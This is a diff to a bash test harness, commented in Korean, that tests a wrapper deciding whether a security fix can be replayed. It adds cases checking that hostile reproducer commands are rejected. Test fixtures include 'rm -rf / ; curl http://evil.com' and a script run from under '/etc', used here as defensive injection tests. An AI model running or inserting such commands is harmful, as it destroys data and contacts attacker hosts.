@@ -28,6 +28,8 @@
 #                                                       (= false-GREEN 누출, §1 목적 정면 훼손)
 #   M4 silent-replay-impossible (INV-FR2 reason 검사 제거 → reason 없이 replay-impossible) → TC-6 FAIL = RED
 #                                                       (= silent 면제 누출)
+#   M5 schema-검증-제거 (INV-SEC-1 _validate_reproducer_command 제거 → bad reproducer exit 0 누출) → TC-10/TC-11 FAIL = RED
+#                                                       (= stored-command injection 누출, THR-E3-2)
 #
 # Exit code:
 #   0 = all fixtures pass (discriminating test validates disposition logic)
@@ -38,45 +40,61 @@ set -euo pipefail
 REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
 WRAPPER="$REPO_ROOT/scripts/check-fix-replay-disposition.sh"
 
+# ─────────────────────────────────────────────────────────────────────────────
+# 인터프리터 가드 (P1-b harness 결정론화): Windows python3 shim 간헐 빈출력 회피.
+#   harness 파싱은 단일 인터프리터로 고정 — PYTHON env override 가능, 미설정 시 python3,
+#   python3 부재 시 `py -3` (Windows launcher) fallback. SSOT 로직은 wrapper 가 자체
+#   python3 floor 로 실행 (ADR-061 thin wrapper) — 본 가드는 *harness 파싱* 전용.
+# ─────────────────────────────────────────────────────────────────────────────
+if [ -n "${PYTHON:-}" ]; then
+  PYBIN="$PYTHON"
+elif command -v python3 >/dev/null 2>&1; then
+  PYBIN="python3"
+elif command -v py >/dev/null 2>&1; then
+  PYBIN="py -3"
+else
+  PYBIN="python"
+fi
+
 PASS=0
 FAIL=0
 
 # ─────────────────────────────────────────────────────────────────────────────
-# extract_disposition: SSOT 의 stdout JSON 에서 dispositions[0].disposition 추출.
-#   regex-free, jq 미의존 — python3 으로 파싱 (cross-platform, 본 repo python3 floor 가정).
+# parse_disposition_and_prov: SSOT stdout JSON 1회 파싱 → "disposition|provenance_flag" 출력.
+#   P1-b 결정론화: case 당 python3 다회 spawn (extract+has_provenance 별도) 제거 →
+#   wrapper 1회 호출 stdout 을 단일 인터프리터 호출로 disposition + provenance 동시 추출.
+#   regex-free, jq 미의존. 빈입력/parse 실패 = "<EMPTY>|0" (flaky shim 빈출력 흡수).
 # ─────────────────────────────────────────────────────────────────────────────
-extract_disposition() {
-  python3 -c 'import sys,json
-d=json.loads(sys.stdin.read())
+parse_disposition_and_prov() {
+  $PYBIN -c 'import sys,json
+raw=sys.stdin.read()
+try:
+    d=json.loads(raw)
+except Exception:
+    print("<EMPTY>|0"); sys.exit(0)
 ds=d.get("dispositions") or []
-print(ds[0]["disposition"] if ds else "<EMPTY>")'
-}
-
-# ─────────────────────────────────────────────────────────────────────────────
-# has_provenance: stdout JSON 에 provenance artifact 동반 여부 (INV-FR4) 검사.
-#   provenance.script == "fix_replay_disposition" 이면 1, 아니면 0 출력.
-# ─────────────────────────────────────────────────────────────────────────────
-has_provenance() {
-  python3 -c 'import sys,json
-d=json.loads(sys.stdin.read())
+disp=ds[0]["disposition"] if ds else "<EMPTY>"
 p=d.get("provenance") or {}
-print("1" if p.get("script")=="fix_replay_disposition" else "0")'
+prov="1" if p.get("script")=="fix_replay_disposition" else "0"
+print(disp+"|"+prov)'
 }
 
 # ─────────────────────────────────────────────────────────────────────────────
 # run_case: fixture JSON 을 stdin 으로 SSOT 에 주입 → disposition 직접 assert.
 #   $1=name  $2=fixture_json  $3=expected_disposition  $4=description
+#   P1-b: wrapper 1회 호출 후 단일 python 파싱 1회 (case 당 python3 spawn 2~3 → 1).
 #   INV-FR4: PASS/falsified/impossible/undetermined 케이스는 provenance 동반도 함께 assert.
 # ─────────────────────────────────────────────────────────────────────────────
 run_case() {
   local name="$1" fixture="$2" expected="$3" description="$4"
-  local out exit_code=0 actual prov
+  local out exit_code=0 parsed actual prov
 
   out=$(printf '%s' "$fixture" | bash "$WRAPPER" 2>/dev/null) || exit_code=$?
 
   local ok=1
-  actual=$(printf '%s' "$out" | extract_disposition 2>/dev/null) || actual="<PARSE-ERROR>"
-  prov=$(printf '%s' "$out" | has_provenance 2>/dev/null) || prov="0"
+  parsed=$(printf '%s' "$out" | parse_disposition_and_prov 2>/dev/null) || parsed="<PARSE-ERROR>|0"
+  actual="${parsed%%|*}"
+  prov="${parsed##*|}"
 
   [ "$actual" = "$expected" ] || ok=0
   [ "$prov" = "1" ] || ok=0  # INV-FR4: provenance artifact 동반 필수
@@ -205,10 +223,18 @@ run_case "TC-8-no-pl-falsify" \
 #   ★ discriminating: (A)축 falsified[닫기 거부]와 disjoint 증명. M2 always-block kill (falsified 양산 시 FAIL).
 # ═════════════════════════════════════════════════════════════════════════════
 run_setup_error_or_failopen_TC9() {
-  local out exit_code=0 empty prov
+  local out exit_code=0 result
   out=$(printf '%s' '{"findings":[{"id":"F-9","reproducible":true,"reproducer_present":true,"base_sha_present":true,"replay_runs":["red","red"],"deterministic_runs_required":2,"pl_falsified":false}],"codex_available":false}' | bash "$WRAPPER" 2>/dev/null) || exit_code=$?
-  empty=$(printf '%s' "$out" | python3 -c 'import sys,json; d=json.loads(sys.stdin.read()); print("1" if (d.get("dispositions")==[] and d.get("provenance",{}).get("fail_open") is True) else "0")' 2>/dev/null) || empty="0"
-  prov=$(printf '%s' "$out" | has_provenance 2>/dev/null) || prov="0"
+  # P1-b: 단일 python 파싱으로 empty(fail-open) + provenance 동시 추출 (python3 다회 spawn 제거)
+  result=$(printf '%s' "$out" | $PYBIN -c 'import sys,json
+try:
+    d=json.loads(sys.stdin.read())
+except Exception:
+    print("0|0"); sys.exit(0)
+empty="1" if (d.get("dispositions")==[] and d.get("provenance",{}).get("fail_open") is True) else "0"
+prov="1" if d.get("provenance",{}).get("script")=="fix_replay_disposition" else "0"
+print(empty+"|"+prov)' 2>/dev/null) || result="0|0"
+  local empty="${result%%|*}" prov="${result##*|}"
   if [ "$empty" = "1" ] && [ "$prov" = "1" ] && [ "$exit_code" -eq 0 ]; then
     echo "✓ PASS: TC-9-codex-unavailable-fail-open → fail-open (empty dispositions, exit 0) — (B)축 lane-time fail-open, (A)축과 disjoint"
     PASS=$((PASS+1))
@@ -218,6 +244,33 @@ run_setup_error_or_failopen_TC9() {
   fi
 }
 run_setup_error_or_failopen_TC9
+
+# ═════════════════════════════════════════════════════════════════════════════
+# TC-10: reproducer_command_value = raw shell (명령 연쇄 + URL) → SETUP error exit 2
+#   ★ 핵심 discriminating (P1-a INV-SEC-1): M5 schema-검증-제거 kill —
+#     _validate_reproducer_command 제거 시 bad reproducer 가 exit 0 누출 = FAIL.
+#     THR-E3-2 stored-command injection 차단의 코드 enforcement 증명.
+# ═════════════════════════════════════════════════════════════════════════════
+run_setup_error_case "TC-10-bad-schema-raw-shell" \
+  '{"findings":[{"id":"F-10","reproducible":true,"reproducer_present":true,"base_sha_present":true,"replay_runs":["green","green","green"],"deterministic_runs_required":3,"pl_falsified":true,"reproducer_command_value":"rm -rf / ; curl http://evil.com"}],"codex_available":true}' \
+  "reproducer_command_value raw shell(; + URL) → exit 2 SETUP (INV-SEC-1 stored-command injection 차단, THR-E3-2)"
+
+# ═════════════════════════════════════════════════════════════════════════════
+# TC-11: reproducer_command_value = 절대경로 (POSIX absolute) → SETUP error exit 2
+#   ★ discriminating (INV-SEC-1): repo-relative path 만 허용, 절대경로 거부 — M5 kill 보강.
+# ═════════════════════════════════════════════════════════════════════════════
+run_setup_error_case "TC-11-bad-schema-absolute-path" \
+  '{"findings":[{"id":"F-11","reproducible":true,"reproducer_present":true,"base_sha_present":true,"replay_runs":["green","green","green"],"deterministic_runs_required":3,"pl_falsified":true,"reproducer_command_value":"bash /etc/passwd-leak.sh"}],"codex_available":true}' \
+  "reproducer_command_value 절대경로(/etc/...) → exit 2 SETUP (INV-SEC-1 repo-relative path 만, THR-E3-2)"
+
+# ═════════════════════════════════════════════════════════════════════════════
+# TC-12: reproducer_command_value = repo-relative 게이트 호출 (good schema) → PASS
+#   ★ INV-SEC-1 positive case: 정당한 repo-relative reproducer 는 통과 (over-block 아님).
+# ═════════════════════════════════════════════════════════════════════════════
+run_case "TC-12-good-schema-repo-relative" \
+  '{"findings":[{"id":"F-12","reproducible":true,"reproducer_present":true,"base_sha_present":true,"replay_runs":["green","green","green"],"deterministic_runs_required":3,"pl_falsified":true,"reproducer_command_value":"bash scripts/check-plugin-version-bump-self.sh --self-test"}],"codex_available":true}' \
+  "PASS" \
+  "reproducer_command_value repo-relative 게이트 호출 → PASS (INV-SEC-1 정당 명령 통과, over-block 아님)"
 
 set -e
 
@@ -246,6 +299,8 @@ if [ "$FAIL" -eq 0 ]; then
   echo "   → TC-3 FAIL = RED (undetermined 기대인데 PASS = false-GREEN 누출, §1 목적 정면 훼손)"
   echo "M4 silent-replay-impossible (INV-FR2 reason 검사 제거 → reason 없이 replay-impossible)"
   echo "   → TC-6 FAIL = RED (exit 2 기대인데 exit 0 replay-impossible = silent 면제 누출)"
+  echo "M5 schema-검증-제거 (INV-SEC-1 _validate_reproducer_command 제거 → bad reproducer 통과)"
+  echo "   → TC-10/TC-11 FAIL = RED (exit 2 기대인데 exit 0 누출 = stored-command injection 누출, THR-E3-2)"
   echo ""
   echo "핵심 discriminating 쌍: TC-1(all-green+falsify→PASS) ↔ TC-2(all-red→falsified)"
   echo "  — 게이트가 'close 자체'가 아니라 'Retest GREEN 만 close 허용'함을 구별."
